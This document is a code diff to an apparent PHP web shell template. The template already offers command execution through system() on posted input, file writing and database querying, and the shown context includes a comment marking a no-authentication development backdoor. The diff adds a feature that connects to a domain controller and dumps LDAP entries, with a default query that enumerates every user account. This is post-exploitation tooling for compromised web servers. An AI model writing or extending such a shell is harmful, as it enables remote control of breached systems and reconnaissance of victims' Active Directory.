@@ -26,6 +26,7 @@ $WRITE_FILE              = "__FEAT_WRITE_FILE__";
 $RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
 $PHP_INFO                = "__FEAT_PHP_INFO__";
 $QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
+$QUERY_LDAP = "__FEAT_QUERY_LDAP__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
@@ -99,6 +100,13 @@ $ENABLED_FEATURES = [
         "description" => "Query databases using the provided credentials.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
+</svg>',
+    ],
+    $QUERY_LDAP => [
+        "title" => "Query LDAP",
+        "description" => "Query LDAP using the provided credentials.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
 </svg>',
     ],
 ];
@@ -1952,6 +1960,112 @@ function connectAndQueryDatabase(
     }
 }
 
+/**
+ * Handle the query database operation
+ *
+ * @return void
+ */
+function handleQueryDatabase() {
+    connectAndQueryDatabase(
+        $_POST["__PARAM_1__"],
+        $_POST["__PARAM_4__"],
+        $_POST["__PARAM_5__"],
+        $_POST["__PARAM_2__"],
+        intval($_POST["__PARAM_3__"]),
+        $_POST["__PARAM_8__"],
+        $_POST["__PARAM_9__"],
+        $_POST["__PARAM_6__"],
+        $_POST["__PARAM_7__"],
+        $_POST["__PARAM_10__"],
+        $_POST["__PARAM_11__"],
+        $_POST["__PARAM_12__"],
+        $_POST["__PARAM_15__"],
+        $_POST["__PARAM_17__"],
+        $_POST["__PARAM_13__"],
+        $_POST["__PARAM_14__"],
+        $_POST["__PARAM_16__"],
+        $_POST["__PARAM_18__"],
+        $_POST["__PARAM_19__"],
+    );
+}
+
+/**
+ * @param $server string LDAP server
+ * @param $port int|null LDAP port
+ * @param $username string|null LDAP username
+ * @param $password string|null LDAP password
+ * @param $domain string LDAP domain
+ * @param $query string LDAP query
+ *
+ * @return void
+ */
+function runLDAPQuery(string  $server,
+                      ?int    $port,
+                      ?string $username,
+                      ?string $password,
+                      string  $domain,
+                      string  $query,
+): void {
+    $port = $port ?: 389;
+
+    // Connect to LDAP server
+    $ldap_conn = ldap_connect("ldap://$server", $port);
+
+    if (!$ldap_conn) {
+        echo "Connection failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    $base_dn = "DC=" . implode(",DC=", explode(".", $domain));
+    echo "Connected successfully to LDAP server $server:$port.\n";
+    echo "Base DN: $base_dn\n";
+
+    // Set LDAP options
+    ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+    ldap_set_option($ldap_conn, LDAP_OPT_REFERRALS, 1);
+    ldap_set_option($ldap_conn, LDAP_DEREF_ALWAYS, 1);
+
+    // Bind to LDAP server
+    if (!empty($username) && !empty($password)) {
+        $username = "CN=$username,$base_dn";
+        echo "Binding with username: $username\n";
+
+        // Bind with username and password (authenticating)
+        $ldap_bind = ldap_bind($ldap_conn, $username, $password);
+    }
+    else {
+        echo "Binding anonymously\n";
+        $ldap_bind = ldap_bind($ldap_conn);
+    }
+
+    if (!$ldap_bind) {
+        echo "Bind failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Perform LDAP search
+    $ldap_search = ldap_search($ldap_conn, $base_dn, trim($query), ["*"], 0, 0);
+
+    if (!$ldap_search) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Get search result entries
+    $ldap_entries = ldap_get_entries($ldap_conn, $ldap_search);
+
+    if (!$ldap_entries) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    echo "Query executed successfully (Query: $query).\n";
+    echo json_encode($ldap_entries, JSON_PRETTY_PRINT);
+
+    // Close LDAP connection
+    ldap_unbind($ldap_conn);
+}
+
 // TEMPLATE DEVELOPMENT BACKDOOR - START
 // The following snippet is a backdoor that allows for template development without the need to authenticate.
 // This should be removed before deploying the template to a production environment.
@@ -2502,6 +2616,68 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page,
             );
             break;
+        case $QUERY_LDAP:
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"],
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "text",
+                                "Domain controller",
+                                "__PARAM_1__",
+                                "hostname or IP address",
+                                "The domain controller to connect to.",
+                                true,
+                            ),
+                            makeInput(
+                                "text",
+                                "LDAP port",
+                                "__PARAM_2__",
+                                "389",
+                                "The port to connect to.",
+                            ),
+                            makeInput(
+                                "text",
+                                "Domain",
+                                "__PARAM_3__",
+                                "example.com",
+                                "The domain to connect to.",
+                                true,
+                            ),
+                            makeInput(
+                                "text",
+                                "Username",
+                                "__PARAM_4__",
+                                "admin",
+                                "The username to connect with.",
+                            ),
+                            makeInput(
+                                "password",
+                                "Password",
+                                "__PARAM_5__",
+                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                "The password to connect with.",
+                            ),
+                            makeInput(
+                                "textarea",
+                                "Query",
+                                "__PARAM_6__",
+                                "(&(objectClass=user)(sAMAccountName=*))",
+                                "The LDAP query to run against the domain controller.",
+                                true,
+                            ),
+                        ],
+                    ),
+                ],
+                $page,
+            );
+            break;
     }
 
     echo $content;
@@ -2538,26 +2714,16 @@ if (isPost()) {
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            connectAndQueryDatabase(
+            handleQueryDatabase();
+            break;
+        case $QUERY_LDAP:
+            runLDAPQuery(
                 $_POST["__PARAM_1__"],
-                $_POST["__PARAM_4__"],
-                $_POST["__PARAM_5__"],
-                $_POST["__PARAM_2__"],
-                intval($_POST["__PARAM_3__"]),
-                $_POST["__PARAM_8__"],
-                $_POST["__PARAM_9__"],
+                !empty($_POST["__PARAM_2__"]) ? intval($_POST["__PARAM_2__"]) : null,
+                !empty($_POST["__PARAM_4__"]) ? $_POST["__PARAM_4__"] : null,
+                !empty($_POST["__PARAM_5__"]) ? $_POST["__PARAM_5__"] : null,
+                $_POST["__PARAM_3__"],
                 $_POST["__PARAM_6__"],
-                $_POST["__PARAM_7__"],
-                $_POST["__PARAM_10__"],
-                $_POST["__PARAM_11__"],
-                $_POST["__PARAM_12__"],
-                $_POST["__PARAM_15__"],
-                $_POST["__PARAM_17__"],
-                $_POST["__PARAM_13__"],
-                $_POST["__PARAM_14__"],
-                $_POST["__PARAM_16__"],
-                $_POST["__PARAM_18__"],
-                $_POST["__PARAM_19__"],
             );
             break;
         default:
